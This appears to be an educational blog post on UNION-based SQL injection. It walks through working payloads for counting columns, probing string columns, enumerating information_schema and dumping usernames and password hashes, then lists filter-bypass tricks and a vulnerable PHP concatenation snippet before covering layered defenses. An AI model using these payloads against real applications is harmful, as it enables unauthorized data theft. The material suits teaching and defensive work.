---
title: "UNION-Based SQL Injection: Enumeration and Layered Defense"
tags: ["security-basics", "sqli", "web-security"]
---

# UNION-Based SQL Injection: Enumeration and Layered Defense

**TL;DR** — UNION-based SQLi puts raw database rows straight into the HTTP
response, no timing or out-of-band tricks needed. The attack is a short, fixed
workflow: find the column count, find a column that renders, then read the
database's own metadata. Input filtering does not stop it. Parameterized queries
do.

## What it is

The `UNION` operator joins the rows of two `SELECT` statements into one result.
Normal use looks harmless:

```sql
-- Combine customer and employee records into one list
SELECT first_name, city FROM customers
UNION
SELECT first_name, city FROM employees;
```

For an injected `UNION SELECT` to run, SQL imposes two rules the attacker has to
satisfy first:

| Rule | What it means | Why it matters |
|---|---|---|
| Column count match | Both SELECTs must return the same number of columns | A mismatch throws a database error and returns nothing |
| Type compatibility | Matching columns must have compatible types | Mismatches error out; `NULL` and casting work around it |

These rules are not obstacles. They are the first two things the attacker
enumerates.

## Enumeration: mapping the query behind the page

Before reading any data, the attacker needs two facts: how many columns the
original query returns, and which of those columns actually show up in the page.

### Step 1 — Column count with ORDER BY

Increase the `ORDER BY` index until the page errors. The column count is one less
than the index that breaks:

```
GET /products?category=Gifts' ORDER BY 1--     -> 200 OK
GET /products?category=Gifts' ORDER BY 2--     -> 200 OK
GET /products?category=Gifts' ORDER BY 3--     -> 200 OK
GET /products?category=Gifts' ORDER BY 4--     -> 500 Internal Server Error
```

The error at 4 confirms three columns.

### Step 2 — Find a string column with NULL

`NULL` is compatible with any type, so it is the safe placeholder while probing
which column accepts text:

```sql
' UNION SELECT NULL, NULL, NULL--          -- baseline: column count is right
' UNION SELECT 'a', NULL, NULL--           -- OK -> column 1 takes strings
' UNION SELECT NULL, 'a', NULL--           -- OK -> column 2 takes strings
' UNION SELECT NULL, NULL, 'a'--           -- OK -> column 3 takes strings
```

A string column that renders in the page is the channel for pulling data out.

## Exploitation: reading the database

With the column count and a usable channel known, the attacker reads
`information_schema` — the metadata catalog defined by the SQL standard and
present in MySQL, PostgreSQL, and SQL Server.

List the tables:

```sql
' UNION SELECT table_name, NULL, NULL
  FROM information_schema.tables
  WHERE table_schema = database()--
```

Read a table's columns:

```sql
' UNION SELECT column_name, NULL, NULL
  FROM information_schema.columns
  WHERE table_name = 'users'--
```

Dump the rows:

```sql
' UNION SELECT username, password_hash, NULL
  FROM users--
```

The data lands in the browser. No extra tooling needed.

When only one string column is available, the attacker packs several fields into
it with database-specific concatenation — `username || ':' || password` in
PostgreSQL, `CONCAT(username,':',password)` in MySQL.

## Why filtering input does not work

Stripping or escaping `'`, `-`, or the word `UNION` feels like a fix. It is not.
Common bypasses:

- Case variation: `UnIoN SeLeCt`
- Inline comments: `UN/**/ION SE/**/LECT`
- URL and double encoding: `%27`, `%2527`
- Vendor comment syntax: `/*!UNION*/` in MySQL

A blacklist is a race the defender loses over time. The fix is structural.

## Defense in depth

### 1. Parameterized queries

Prepared statements separate the query *structure* from the *data*. The engine
compiles the template before any input is bound, so input is always a literal
value, never executable SQL.

```php
// Vulnerable: string concatenation
$query = "SELECT * FROM users WHERE username = '$username'";

// Safe: parameterized query (PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
```

This removes UNION-based, blind, and error-based SQLi at the source. Start here.

### 2. Whitelist validation

On top of parameterization, check that input matches its expected shape:

- Numeric IDs: reject anything that is not `^\d+$`
- Fixed sets (such as sort order): check against an explicit allowlist
- Strings: enforce a maximum length to limit second-order attacks

Validation narrows the attack surface. It does not replace parameterization.

### 3. Least privilege

Give the application's database account only the grants its features need:

| Feature | Grant it needs | Do not grant |
|---|---|---|
| Product catalog (read-only) | `SELECT` on `products` | `UPDATE`, `DELETE`, `DROP` |
| Order submission | `INSERT` on `orders` | Access to `users`, `admin_*` |
| Admin dashboard | Scoped `SELECT` | Access to `information_schema` |

If an injection slips through, a least-privilege account still cannot read tables
it has no grant on. That caps the blast radius.

### 4. WAF

A WAF catches known SQLi signatures and buys time for response. It mitigates; it
does not prevent:

- Obfuscation evades rules (see the bypasses above)
- Rules need tuning and produce false positives
- Run it in blocking mode in production, not detection only

A WAF backs a parameterized codebase. It never replaces one.

### 5. Detection

You cannot respond to what you cannot see. Log and alert on:

- SQL error-rate spikes — often active enumeration
- Query shapes with `UNION`, `information_schema`, or stray `NULL`s from code paths that never generate them
- Response-size outliers — UNION dumps inflate payloads against a baseline

Feed database logs into your SIEM and set thresholds.

## Takeaway

UNION-based SQLi is a fixed recipe: count columns, find a channel, read
metadata, dump. Knowing the recipe is what lets you defend against it instead of
checking a compliance box. The controls above are layers, not alternatives:
parameterized queries kill the root cause, least privilege limits the damage,
WAF and monitoring give you visibility. Use all of them.
